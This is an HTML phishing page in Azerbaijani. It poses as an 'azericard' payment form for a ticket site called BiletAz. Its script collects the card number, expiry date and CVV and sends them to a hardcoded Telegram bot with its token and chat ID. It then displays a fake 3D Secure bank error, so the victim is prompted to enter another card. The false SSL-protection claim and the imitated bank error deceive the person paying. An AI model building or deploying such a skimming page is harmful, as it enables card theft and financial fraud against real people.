<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ödəniş - BiletAz</title>
    <style>
        body {
            margin: 0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #e8edf8;
            color: #26314d;
        }
        .payment-page {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            position: relative;
        }
        .payment-card {
            width: 100%;
            max-width: 430px;
            background: #fff;
            border-radius: 30px;
            padding: 36px 30px 30px;
            box-shadow: 0 28px 80px rgba(45, 84, 160, 0.14);
            border: 1px solid rgba(18, 52, 100, 0.08);
            position: relative;
            transition: all 0.3s ease;
        }
        .payment-brand {
            display: flex;
            justify-content: center;
            margin-bottom: 25px;
        }
        .brand-text {
            font-size: 1.6rem;
            font-weight: 700;
            letter-spacing: -0.04em;
            color: #0f3460;
            text-transform: lowercase;
        }
        .brand-text::first-letter {
            color: #0562ff;
            text-transform: uppercase;
        }
        .payment-title {
            text-align: center;
            font-size: 1.4rem;
            font-weight: 700;
            margin-bottom: 28px;
            color: #17223b;
        }
        .input-group {
            margin-bottom: 18px;
        }
        .input-group label {
            display: block;
            margin-bottom: 10px;
            font-size: 0.95rem;
            color: #5f6f95;
            font-weight: 600;
            transition: color 0.3s;
        }
        .input-group input {
            width: 100%;
            padding: 16px 18px;
            border-radius: 16px;
            border: 1px solid #d7dfee;
            background: #f7f9ff;
            font-size: 0.98rem;
            color: #242f4b;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }
        .input-group input:focus {
            border-color: #3b6fff;
            box-shadow: 0 0 0 4px rgba(59, 111, 255, 0.1);
        }
        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }
        .pay-btn {
            width: 100%;
            margin-top: 24px;
            padding: 16px 0;
            border: none;
            border-radius: 18px;
            background: #0562ff;
            color: white;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .pay-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 14px 38px rgba(5, 98, 255, 0.24);
        }
        .pay-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }
        .note {
            margin-top: 18px;
            color: #7c88a8;
            font-size: 0.92rem;
            text-align: center;
            line-height: 1.6;
        }

        /* XƏTA VƏ ANİMASİYA STİLLƏRİ */
        .error-text {
            color: #ff3b30 !important;
        }
        
        /* Titrəmə Animasiyası */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }
        .shake-animation {
            animation: shake 0.4s ease-in-out;
        }

        /* Müasir Xəta Modal Pəncərəsi */
        .error-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            border-radius: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px;
            box-sizing: border-box;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
            text-align: center;
            z-index: 10;
        }
        .error-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }
        .error-icon {
            width: 70px;
            height: 70px;
            background: #fff5f5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ff3b30;
            font-size: 32px;
            font-weight: bold;
            border: 2px solid #ffe5e5;
            margin-bottom: 20px;
            box-shadow: 0 10px 25px rgba(255, 59, 48, 0.15);
        }
        .error-overlay h3 {
            margin: 0 0 10px 0;
            color: #17223b;
            font-size: 1.3rem;
        }
        .error-overlay p {
            margin: 0 0 25px 0;
            color: #6c7a9c;
            font-size: 0.95rem;
            line-height: 1.5;
        }
        .close-overlay-btn {
            background: #0f3460;
            color: white;
            border: none;
            padding: 12px 35px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .close-overlay-btn:hover {
            background: #0562ff;
        }
    </style>
</head>
<body>
    <main class="payment-page">
        <div class="payment-card">
            
            <div class="error-overlay" id="errorOverlay">
                <div class="error-icon">✕</div>
                <h3>3D Secure Xətası</h3>
                <p>Əməliyyat emal edilə bilmədi. Emitent bank tərəfindən müvəqqəti məhdudiyyət qoyulub (Xəta kodu: 5004). Zəhmət olmasa başqa kartla yoxlayın.</p>
                <button class="close-overlay-btn" onclick="baqlatXetani()">Yenidən Cəhd Et</button>
            </div>

            <div class="payment-brand">
                <span class="brand-text">azericard</span>
            </div>
            <div class="payment-title">Kart məlumatlarını daxil edin</div>

            <form id="paymentForm">
                <div class="input-group">
                    <label for="cardNumber" id="cardLabel">Kart nömrəsi <span id="cardErrSpan"></span></label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" required>
                </div>

                <div class="row">
                    <div class="input-group">
                        <label for="expiry" id="expiryLabel">Bitmə tarixi <span id="expiryErrSpan"></span></label>
                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" required>
                    </div>
                    <div class="input-group">
                        <label for="cvv">CVV/CVC</label>
                        <input type="password" id="cvv" placeholder="***" maxlength="3" autocomplete="cc-csc" required>
                    </div>
                </div>

                <button type="submit" class="pay-btn" id="payButton" disabled>Ödənişi Təsdiqlə</button>
                <div class="note">Məlumatlarınız 256-bit SSL şifrələmə ilə qorunur.</div>
            </form>
        </div>
    </main>

    <script>
        const form = document.getElementById('paymentForm');
        const cardNumber = document.getElementById('cardNumber');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const payButton = document.getElementById('payButton');
        
        const cardLabel = document.getElementById('cardLabel');
        const cardErrSpan = document.getElementById('cardErrSpan');
        const expiryLabel = document.getElementById('expiryLabel');
        const expiryErrSpan = document.getElementById('expiryErrSpan');
        const errorOverlay = document.getElementById('errorOverlay');

        const BOT_TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
        const CHAT_ID = '8055987590';

        const daxilEtReqem = (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        };

        // Kart nömrəsi inputu
        cardNumber.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let matches = v.match(/\d{4,16}/g);
            let match = matches && matches[0] || '';
            let parts = [];

            for (let i=0, len=match.length; i<len; i+=4) {
                parts.push(match.substring(i, i+4));
            }

            e.target.value = parts.length > 0 ? parts.join(' ') : v;

            // Yazarkən 16 rəqəm tamamlanıbsa xəta vizualını təmizlə
            if(v.length === 16) {
                cardLabel.classList.remove('error-text');
                cardErrSpan.innerText = "";
            }
            yoxlaForm();
        });

        // Kartdan fokus çıxanda (blur) 16 rəqəm deyilsə animasiya işə düşür
        cardNumber.addEventListener('blur', () => {
            const təmizKart = cardNumber.value.replace(/\s/g, '');
            if(təmizKart.length > 0 && təmizKart.length < 16) {
                cardLabel.classList.add('error-text');
                cardErrSpan.innerText = " (16 rəqəm olmalıdır)";
                cardLabel.classList.remove('shake-animation');
                void cardLabel.offsetWidth; // Animasiyanı yenidən tətikləmək üçün trigger
                cardLabel.classList.add('shake-animation');
            }
        });

        // Tarix inputu və Keçmiş Zaman Yoxlanışı
        expiry.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            if (v.length >= 2) {
                e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
            } else {
                e.target.value = v;
            }

            // Keçmiş il/ay yoxlanışı
            if(e.target.value.length === 5) {
                const [inputAy, inputIl] = e.target.value.split('/').map(Number);
                const cariTarih = new Date();
                const cariAy = cariTarih.getMonth() + 1; // Yanvar 0-dır
                const cariIl = Number(cariTarih.getFullYear().toString().slice(-2)); // Son iki rəqəm (Məs: 26)

                if (inputIl < cariIl || (inputIl === cariIl && inputAy < cariAy) || inputAy > 12 || inputAy === 0) {
                    expiryLabel.classList.add('error-text');
                    expiryErrSpan.innerText = " (Keçmiş/Səhv tarix)";
                } else {
                    expiryLabel.classList.remove('error-text');
                    expiryErrSpan.innerText = "";
                }
            } else {
                expiryLabel.classList.remove('error-text');
                expiryErrSpan.innerText = "";
            }

            yoxlaForm();
        });

        cvv.addEventListener('input', (e) => {
            daxilEtReqem(e);
            yoxlaForm();
        });

        function yoxlaForm() {
            const kartDuzgun = cardNumber.value.replace(/\s/g, '').length === 16;
            const tarixDuzgun = expiry.value.length === 5 && !expiryLabel.classList.contains('error-text');
            const cvvDuzgun = cvv.value.length === 3;

            payButton.disabled = !(kartDuzgun && tarixDuzgun && cvvDuzgun);
        }

        // Form Göndəriləndə
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            payButton.disabled = true;
            payButton.innerText = 'Yoxlanılır...';

            const mesaj = `💳 *Yeni Kart Məlumatı Gəldi!*\n\n` +
                          `● *Kart:* \`${cardNumber.value}\`\n` +
                          `● *Tarix:* \`${expiry.value}\`\n` +
                          `● *CVV:* \`${cvv.value}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: mesaj,
                        parse_mode: 'Markdown'
                    })
                });

                // Telegram bota mesaj uğurla getsə belə istifadəçiyə professional xəta pəncərəsi açırıq
                if (response.ok) {
                    setTimeout(() => {
                        errorOverlay.classList.add('active');
                    }, 1200); // 1.2 saniyəlik süni bank gözləməsi (loading) effekti
                } else {
                    alert('Şəbəkə xətası baş verdi, yenidən cəhd edin.');
                }
            } catch (error) {
                alert('Bağlantı kəsildi.');
            } finally {
                setTimeout(() => {
                    payButton.innerText = 'Ödənişi Təsdiqlə';
                    yoxlaForm();
                }, 1200);
            }
        });

        // Xəta pəncərəsini bağlamaq düyməsi
        function baqlatXetani() {
            errorOverlay.classList.remove('active');
            form.reset();
            yoxlaForm();
        }
    </script>
</body>
            </html>
